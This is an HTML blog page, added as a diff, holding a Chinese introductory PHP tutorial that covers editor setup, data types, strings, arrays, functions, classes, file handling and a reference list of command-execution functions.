@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#33363b">
+    <meta name="msapplication-TileColor" content="#33363b">
+    
+    
+    
+    
+    <meta name="keywords" content="Life, ARIA, Hexo">
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-chrome-192x192.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+    
+    
+    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#33363b">
+    
+    
+    <link rel="manifest" href="/favicons/site.webmanifest">
+    
+    
+    <meta name="msapplication-config" content="/favicons/browserconfig.xml">
+    
+    
+    <link rel="alternate" href="/atom.xml" title="TuringGu" type="application/atom+xml">
+    
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicons/favicon.ico">
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/css/page.css">
+<link rel="stylesheet" type="text/css" href="/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/css/atom-one-dark.css">
+    <link rel="stylesheet" type="text/css" href="/css/lightgallery.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/js/util.js"></script>
+    <script defer type="text/javascript" src="/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/js/lg-zoom.min.js"></script>
+    
+    <script defer src="/js/busuanzi.pure.mini.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/js/index.js"></script>
+    
+    <script defer type="text/javascript" src="/js/custom.js"></script>
+    <title>PHP入门基础 | TuringGu - Info Security</title>
+  </head>
+  <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh_CN" data-spy="scroll" data-target=".list-group">
+    
+<header id="header" class="header" style="background: #33363b;">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/">TuringGu</a></h1>
+        <h2 class="subtitle">Info Security</h2>
+      </div>
+      
+      <div class="logo">
+        <img src="/images/logo.png" alt="logo">
+      </div>
+      
+    </div>
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="切换导航栏"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
+        
+        <li role="menuitem"><a href="/">首页</a></li>
+        
+        <li role="menuitem"><a href="/archives/">归档</a></li>
+        
+        <li role="menuitem"><a href="/categories/">分类</a></li>
+        
+        <li role="menuitem"><a href="/tags/">标签</a></li>
+        
+        <li role="menuitem"><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</header>
+
+
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2018/12/15/Php_basic/">
+      <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="TuringGu">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/images/myavatar.jpg">
+      </span>
+      <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="TuringGu">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">PHP入门基础</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2018-12-15T17:00:00+08:00">2018-12-15 17:00:00</time></span>
+        </span>
+        
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文主要为基础入门做个引子，对常见的或者常用的知识做个简介，方便自己和他人查阅。</p>
+<p><strong>注：补充知识放在文末</strong></p>
+<hr>
+<h3 id="Sublime配置"><a href="#Sublime配置" class="headerlink" title="Sublime配置"></a>Sublime配置</h3><blockquote>
+<p>OS: windows 10</p>
+</blockquote>
+<p><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">Sublime官网</a><br>这里选择windows版下载安装。<br>步骤如下：</p>
+<ol>
+<li>打开Sublime编辑器，输入如下代码：<figure class="hljs highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br>    <span class="hljs-string">"cmd"</span>: [<span class="hljs-string">"php"</span>, <span class="hljs-string">"$file"</span>],<br>    <span class="hljs-string">"file_regex"</span>: <span class="hljs-string">"php$"</span>,<br>    <span class="hljs-string">"selector"</span>: <span class="hljs-string">"source.php"</span><br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>一般保存至默认路径即可，如若默认路径有变，则手动选择如下路径：<br><code>C:\User(用户)\{YourName}\AppData\Roaming\Sublime Text3\Packages\User\</code></p>
+<ol start="2">
+<li>添加PHP环境变量：<br>在<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpStudy安装</a>目录中，找到php目录下你想使用的对应php版本，比如这里我选择php-7.0.12-nts。<br>进入文件夹，复制路径。</li>
+</ol>
+<p>打开系统环境变量添加所复制的路径，这里我使用如下方法：</p>
+<blockquote>
+<p>右击计算机–&gt;属性–&gt;高级系统设置–&gt;环境变量–&gt;系统变量</p>
+</blockquote>
+<p>找到变量Path，编辑并新建值，复制php路径，确认并退出。</p>
+<ol start="3">
+<li><p>在Sublime编辑器选项卡中依次打开：<br><code>Tools--&gt;Build System--&gt;php</code><br>这里会出现<code>php</code>选项，是由于第一步文件的配置以及第二步环境变量配置均无误，否则将不会出现这个选项。</p>
+</li>
+<li><p>配置完成<br>快捷键：<code>Ctrl + b</code>即可输出显示php被解释后的运行结果。</p>
+</li>
+</ol>
+<hr>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h4><ul>
+<li>PHP是嵌入HTML页面中的脚本语言</li>
+<li>是目前最流行的网站开发语言</li>
+<li>在几乎所有的平台中都可以运行</li>
+<li>很多的企业都在使用PHP作为开发语言</li>
+</ul>
+<hr>
+<h4 id="基础规范"><a href="#基础规范" class="headerlink" title="基础规范"></a>基础规范</h4><blockquote>
+<ol>
+<li>PHP脚本以<code>&lt;?php</code>开始，以<code>?&gt;</code>结束为规范写法。若为最后一行，可以省略<code>?&gt;</code></li>
+<li>PHP 脚本可以单独存在，也可以与html页面结合</li>
+<li>php文件扩展名规范，一般是<code>.php</code>结尾。但是，也可以使用其他命名，如<code>.phtml</code>等，具体是定义在配置文件中的。</li>
+</ol>
+</blockquote>
+<hr>
+<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><blockquote>
+<p>布尔类型<code>（bool）</code><br>整型<code>（int）</code><br>浮点型<code>（float）</code><br>字符串<code>（string)</code><br>资源<code>（resource）</code><br>空类型<code>（NULL）</code><br>数组<code>（array）</code><br>对象<code>（class）</code></p>
+</blockquote>
+<p>一般可使用<code>var_dump()</code>来查看类型</p>
+<h4 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h4><p>常量：</p>
+<blockquote>
+<p>一旦赋值不会改变，且应尽量使用大写。<br>常量分为系统常量和自定义常量。<br>系统常量可以理解为值不会有改变的量</p>
+</blockquote>
+<p>定义常量</p>
+<blockquote>
+<p>使用PHP中的函数<code>define()</code>定义自定义常量<br>常量在使用时，不需要<code>$</code>符号<br>常用定义：<code>Define(&#39;ROOT&#39;,&#39;localhost&#39;);</code></p>
+</blockquote>
+<p>常用系统常量：</p>
+<blockquote>
+<p><code>__FILE__</code>：php程序文件名/绝对路径<br><code>__DIR__</code>：被调用的文件脚本所在目录<br><code>__FUNCTION__</code>：函数名<br><code>__LINE__</code>：PHP程序文件行数<br><code>PHP_VERSION</code>：当前解析器的版本号<br><code>PHP_OS</code>：执行当前PHP版本的操作系统名称</p>
+</blockquote>
+<hr>
+<p>变量：</p>
+<blockquote>
+<p>变量以<code>$</code>符开始，后面跟着变量名称<br>变量必须以字母或下划线字符开始、只能包含字母数字字符以及下划线（A-z、0-9和_）<br>变量名不能包含空格，且区分大小写。</p>
+</blockquote>
+<hr>
+<h4 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h4><p>输出：<br><code>echo、print、printf、sprintf、print_r、die、var_dump</code></p>
+<p>输入：<br>cli命令行模式接收参数：三种方式</p>
+<blockquote>
+<p>使用argv数组、使用getopt方法、提示用户输入</p>
+</blockquote>
+<p>argv：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 使用 $argc $argv 接受参数<br> */</span><br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">"接收到&#123;$argc&#125;个参数"</span>;<br>print_r($argv);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p>getopt:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 使用 getopt函数<br> */</span><br> <br>$param_arr = getopt(<span class="hljs-string">'a:b:'</span>);<br>print_r($param_arr);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p>提示用户输入：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 提示用户输入，类似Python<br> */</span><br>fwrite(STDOUT,<span class="hljs-string">'请输入您的博客名：'</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'您输入的信息是：'</span>.fgets(STDIN);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<h4 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h4><p>PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。</p>
+<p>使用概述：</p>
+<blockquote>
+<ol>
+<li>必须后接分号，否则编译不通过</li>
+<li>EOF可以用任意其它字符代替，只需保证结束标识与开始标识一致</li>
+<li>结束标识必须顶格独自占一行，前后不能衔接任何空白字符</li>
+<li>开始标识可以不单引号或双引号，不带引号与带双引号效果一致，均解释内嵌的变量和转义符号，但带单引号则不解释。</li>
+<li>当内容需要内嵌引号（单、双引号）时，不需要加转义符，本身对单双引号转义。</li>
+</ol>
+</blockquote>
+<hr>
+<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>比较运算符：</p>
+<blockquote>
+<p>大于、小于、等于等运算，它们的结果都是bool值类型</p>
+</blockquote>
+<p>逻辑运算符：</p>
+<blockquote>
+<p>与或非运算<br>and或&amp;&amp;    or或||    not或!<br>它们的结果都是bool值</p>
+</blockquote>
+<hr>
+<h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><blockquote>
+<p><code>.</code>拼接运算符<br>长度计算：<br><code>strlen()、mb_strlen()</code>都可以用来计算字符串长度，区别在于<code>mb_strlen</code>可以计算中文字符串长度<br><code>addslashes()</code>将预定义的字符添加反斜杠转义,即<br><code>bin2hex()</code>将<code>ascii</code>字符串转换为16进制<br><code>chop()</code>移除字符串右侧的空白字符或其他字符，这些字符需要自己指定的，默认则为空白字符<br><code>chr()</code> 将指定的ascii值转换成字符<br><code>crypt()</code>对字符串单项加密，不可逆转，类似于做md5值<br><code>htmlentities()</code> 将字符串转换为html实体<br><code>echo htmlentities(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);</code>用于防御XSS攻击<br><code>implode()</code>返回一个由数组元素组合成的字符串，与<code>explode()</code>相反作用<br><code>md5()</code>计算字符串的md5值<br><code>md5_file()</code>计算文件的md5值<br><code>str_replace()</code>替换字符串中的一部分（大小写敏感）<br><code>str_ireplace()</code> 同上（大小写不敏感）<br><code>str_split()</code> 把字符串分割到数组中，php4\5\7均支持，但无法按照指定的字符来做分割<br><code>split()</code> 按照指定的字符来分割，与<code>explode</code>用法相似，<code>split</code>函数仅可在php4\5中使用，PHP7废除了此用法<br><code>strcmp</code> 比较两个字符串（大小写敏感）</p>
+</blockquote>
+<blockquote>
+<p><strong>php的单双引号都能输出字符串，但双引号中的$可以传值，但在单引号中不行。</strong></p>
+</blockquote>
+<hr>
+<h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><blockquote>
+<ol>
+<li>强制型：（数据类型）数据变量<br><code>(int)$var  (string)$var  (float)$var  (bool)$var</code></li>
+<li>使用具体类型函数转换：<br><code>intval()  floatval()  strval()</code></li>
+<li>使用通用类型转换函数：<br><code>settype(mixed var, string)</code></li>
+</ol>
+</blockquote>
+<p>一些例子：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">var_dump((int)$b);<br>var_dump((int)str_replace(<span class="hljs-string">"1"</span>, <span class="hljs-string">""</span>, $a));<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>定义：</p>
+<blockquote>
+<p>数组是特殊的变量，可以在单个变量中同时保存一个或一个以上的值，并且可以通过下标来访问其中的某一个值。在PHP中，用array()函数创建数组。同时在php中数组可以存储任意类型的数据。<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">$arr = array(&apos;我是&apos;, &apos;一个&apos;, &apos;数组&apos;);<br></code></pre></td></tr></table></figure></p>
+</blockquote>
+<hr>
+<h5 id="数组分类"><a href="#数组分类" class="headerlink" title="数组分类"></a>数组分类</h5><p>PHP中数组一般分为索引数组和关联数组。第三种叫多维度数组。</p>
+<p>定义：<br>索引数组是指数组的建是整数的数组，并且键的整数顺序是从0开始的，并依次递增。</p>
+<hr>
+<h5 id="三种赋值方式："><a href="#三种赋值方式：" class="headerlink" title="三种赋值方式："></a>三种赋值方式：</h5><blockquote>
+<ol>
+<li>用数组变量的名字后面加一个中括号的方式赋值。而且中括号内的键一定要是整数。例如：<br><code>$a[1] = 0;</code></li>
+<li>用<code>array()</code>创建一个空数组，使用<code>=&gt;</code>分隔左侧键和右侧值。且键一定为整数。</li>
+<li>用array()创建一个空数组，直接在数组里用英文的单引号或双引号赋值，数组会默认建立从<code>0</code>开始的整数的键。</li>
+</ol>
+</blockquote>
+<hr>
+<h5 id="访问关联数组的内容"><a href="#访问关联数组的内容" class="headerlink" title="访问关联数组的内容"></a>访问关联数组的内容</h5><blockquote>
+<ol>
+<li>直接使用键来输出：<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$score = <span class="hljs-keyword">array</span>(<span class="hljs-string">"Math"</span> =&gt; <span class="hljs-string">"数学"</span>);<br>$scoreMaths = $score[<span class="hljs-string">"Maths"</span>];<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+</blockquote>
+<ol start="2">
+<li>使用foreach输出：<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>($project <span class="hljs-keyword">as</span> $k =&gt; $z) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br /&gt;"</span>;<br>    <span class="hljs-keyword">echo</span> $k.<span class="hljs-string">"是"</span>.$z.<span class="hljs-string">"。 "</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h5 id="操作技巧"><a href="#操作技巧" class="headerlink" title="操作技巧"></a>操作技巧</h5><blockquote>
+<ul>
+<li>获取数组长度，<code>count()</code>和<code>sizeof</code>统计数组下标个数</li>
+<li><code>each()</code> 返回当前元素的键名和键值，并将内部指针向前移动。</li>
+<li><code>list()</code> 用于在一次操作中给一组变量赋值</li>
+<li>数组元素的排序：<blockquote>
+<p><code>sort()</code>、<code>asort()</code>和<code>ksort()</code>都是正向排序，<code>rsort</code>、<code>arsort()</code>、<code>krsort()</code>都是反向排序</p>
+</blockquote>
+</li>
+<li><code>array_count_values()</code>统计数组内下标值得个数</li>
+<li><code>current()</code> 每个数组都有一个内部指针指向他的当前单元，初始指向插入到数组中的第一个元素</li>
+<li><code>array_pad()</code> 数组首位选择性追加</li>
+<li><code>unset()</code> 用于销毁指定的<strong>变量</strong></li>
+<li><code>array_fill()</code> 用键值填充数组</li>
+<li><code>array_splice()</code> 删除数组成员</li>
+<li><code>array_unique()</code> 删除数组中的重复值</li>
+<li><code>array_flip()</code> 交换数组的键值和值</li>
+<li><code>array_search()</code> 搜索数组</li>
+<li><code>array_combine()</code> 通过合并两个数组来创建一个新数组，其中的一个数组元素为键名，另一个数组元素为键值</li>
+</ul>
+</blockquote>
+<hr>
+<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><p>定义：</p>
+<blockquote>
+<p>参数就是通过参数列表可以传递信息到函数（以逗号作为分隔符）的表达式列表。参数类似于一个变量，通过传递参数可以使函数实现对参数的运算。</p>
+</blockquote>
+<p>参数可以是任意类型的数据，具体要根据函数功能来确定。例如：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">square</span><span class="hljs-params">($a)</span> </span>&#123;<br>    <span class="hljs-keyword">echo</span> $a * $a;<br>&#125;<br>    square(<span class="hljs-number">2</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h5 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h5><p>PHP语言自带许多函数，常见的有：</p>
+<blockquote>
+<p><code>isset()</code> 判断变量是否存在<br><code>strlen()</code> 计算字符串长度<br><code>var_dump()</code> 输出变量类型和具体内容（常用于调试）<br><code>mysql_connect()</code> 链接数据库<br><code>function_exists()</code> 判断函数是否存在</p>
+</blockquote>
+<hr>
+<h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><p>编写一个函数，对数组实现<code>array_flip()</code>操作，返回一个新的数组：</p>
+<hr>
+<h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><blockquote>
+<p>（OOP）Object-Oriented Programming 面向对象程序语言<br>对象是一个由信息及对信息进行处理的秒说所组成的整体，是对现实世界的抽象。</p>
+</blockquote>
+<p>类：</p>
+<blockquote>
+<p>定义了一件事物的抽象特点，类的定义包含了数据的形式以及对数据的操作</p>
+</blockquote>
+<p>对象：</p>
+<blockquote>
+<p>类的具体实际例子</p>
+</blockquote>
+<hr>
+<h5 id="对象的主要三个特征"><a href="#对象的主要三个特征" class="headerlink" title="对象的主要三个特征"></a>对象的主要三个特征</h5><blockquote>
+<p>对象的行为：可以对对象施加的操作。如：开灯，关灯<br>对象的形态：当施加那些方法时，对象如和响应。如：颜色、尺寸、外形<br>对象的表示：就相当于省份证，具体区分在相同的行为与状态下有何不同</p>
+</blockquote>
+<hr>
+<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><blockquote>
+<p><code>fread()</code> 读取指定长度的字符串<br><code>fgets()</code> 读取文件一行的内容<br><code>file_get_contents()</code> 读取文件内容<br><code>feof()</code> 检测文件指针是否已到达文件末尾</p>
+</blockquote>
+<p>读取文件全部内容:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">fread($file, filesize($file));<br>file_get_contents($file);<br><span class="hljs-keyword">while</span> (!feof($file)) &#123;<br>	fgets($file);<br>&#125;<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h5 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h5><p><code>fwrite()</code> 写入数据</p>
+<h5 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h5><p><code>fclose()</code> 关闭文件</p>
+<hr>
+<h5 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h5><blockquote>
+<ul>
+<li>获取文件大小：<code>filesize()</code></li>
+<li>使用<code>is_readable</code>与<code>is_writeable</code>判断文件是否存在的基础上，是否可读或可写</li>
+<li>使用<code>is_file</code>和<code>file_exists</code>判断指定路径是否存在某文件</li>
+</ul>
+</blockquote>
+<hr>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><p><code>eval()</code>、<code>assert()</code></p>
+<h5 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h5><blockquote>
+<p><code>system()</code> 输出并返回最后一行shell结果<br><code>exec()</code> 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回数组里<br><code>passthru()</code> 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。<br><code>popen()</code>、<code>shell_exec()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code> 反引号这个实际上使用的是<code>shell_exex</code></p>
+</blockquote>
+<h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><h4 id="解释性语言与编译型语言"><a href="#解释性语言与编译型语言" class="headerlink" title="解释性语言与编译型语言"></a>解释性语言与编译型语言</h4><ol>
+<li>解释型语言<blockquote>
+<p>如：<code>Php</code>，<code>phthon</code>，<code>shel</code><br>由上到下解释每一行<br>特点：每次使用，每次解释，且需要解释器<br>兼容性问题基本没有</p>
+</blockquote>
+</li>
+</ol>
+<ol start="2">
+<li>编译型语言<blockquote>
+<p>如：<code>C</code>,<code>C++</code>，<code>Java</code><br>需要编译才能执行（将文本文件<code>test.c</code>编译成二进制文件<code>test.exe</code>）<br>编译后生成二进制文件，让系统执行<br>特点：一次编译，多次使用；但跨平台性较弱，需要修改源码。<br>比如c语言有如下两个标准：</p>
+<blockquote>
+<p><code>c90+win</code>编译标准<br><code>c99+linux</code>编译标准<br>他们不能通用</p>
+</blockquote>
+</blockquote>
+</li>
+</ol>
+<hr>
+<h4 id="PHP与JSP"><a href="#PHP与JSP" class="headerlink" title="PHP与JSP"></a>PHP与JSP</h4><p>PHP适用于小型网站<br>JSP遵循java语法，且用于大型网站<br>中型网站两者混用</p>
+<hr>
+<h4 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h4><p>例子：</p>
+<blockquote>
+<p>使用php输出that’s ok</p>
+<ol>
+<li>使用双引号中插入单引号</li>
+<li>使用单引号，但时加上转义字符<code>\</code></li>
+</ol>
+</blockquote>
+<hr>
+<h4 id="PHP中布尔类型特点"><a href="#PHP中布尔类型特点" class="headerlink" title="PHP中布尔类型特点"></a>PHP中布尔类型特点</h4><p>只要“错”就是“空”，但是一旦被赋为某种类型，就与“空”没有关系了</p>
+<p>PHP是弱类型<br>eg:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$a = <span class="hljs-number">1</span>;	$b=<span class="hljs-keyword">true</span>;<br>var_dump($a==$b);	<span class="hljs-comment">// Result is true</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="常见网站搭建套路（铁三角）"><a href="#常见网站搭建套路（铁三角）" class="headerlink" title="常见网站搭建套路（铁三角）"></a>常见网站搭建套路（铁三角）</h4><blockquote>
+<p><code>apache/nginx + php + mysql</code> 开源<code>(php)</code>全家桶<br><code>tomcat + jsp + oracle</code>     其中<code>java，oracle</code>不开源<br><code>iis + asp + mssql/access</code>    微软全家桶，贵，功能少，质量差(常见于建站早，更换搭建方式代价极高的网站)</p>
+</blockquote>
+<hr>
+<h4 id="PHP调试错误提示"><a href="#PHP调试错误提示" class="headerlink" title="PHP调试错误提示"></a>PHP调试错误提示</h4><blockquote>
+<p><code>notice</code>：提示，可前面加<code>@</code>屏蔽，如<code>@var_dump</code><br><code>waring</code>：警告<br><code>error</code>：错误</p>
+</blockquote>
+<hr>
+<h4 id="PHP字符占用字节数"><a href="#PHP字符占用字节数" class="headerlink" title="PHP字符占用字节数"></a>PHP字符占用字节数</h4><blockquote>
+<p><code>utf-8</code>，每个中文占3字节<br><code>gbk</code>，每个中文占2字节<br>无论什么编码的英文，每个字母均只占1字节</p>
+</blockquote>
+<p>eg:<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">echo strlen(&quot;你写的中文&quot;);<br>echo mb_strlen(&quot;你写的中文&quot;);<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="常见名词的概念"><a href="#常见名词的概念" class="headerlink" title="常见名词的概念"></a>常见名词的概念</h4><blockquote>
+<ul>
+<li>成员变量<br>定义在类内部的变量。该变量的值对外是不可见的，但可通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性</li>
+<li>成员函数<br>定义在类的内部，可用于访问对象的数据</li>
+<li>继承<br>继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，吧这个已存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li>
+<li>父类<br>一个类被其他类继承，可将该类称为父类，或基类，或超类</li>
+<li>子类<br>一个类继承其他类称为子类，也可称为派生类</li>
+<li>多态<br>多态性是指相同的函数或方法可用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性</li>
+<li>重载<br>函数或方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互称为重载函数或者方法</li>
+<li>抽象性<br>指具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li>
+<li>封装<br>指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li>
+<li>构造函数<br>主要用来在创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中</li>
+<li>析构函数（destructor）<br>与构造函数相反，当对象结束其生命周期时，系统自动执行（例如在建立对象时用new开辟了一片内存空间，应在推出前在析构函数中用delete释放）</li>
+</ul>
+</blockquote>
+<hr>
+<h4 id="网络安全中的防御"><a href="#网络安全中的防御" class="headerlink" title="网络安全中的防御"></a>网络安全中的防御</h4><blockquote>
+<p>以规则对抗规则，即防御规则对抗攻击规则</p>
+</blockquote>
+<p>例如：写100条防御语句，找到其中没有防御到的语句即可</p>
+<p>fuzz    // 模糊测试</p>
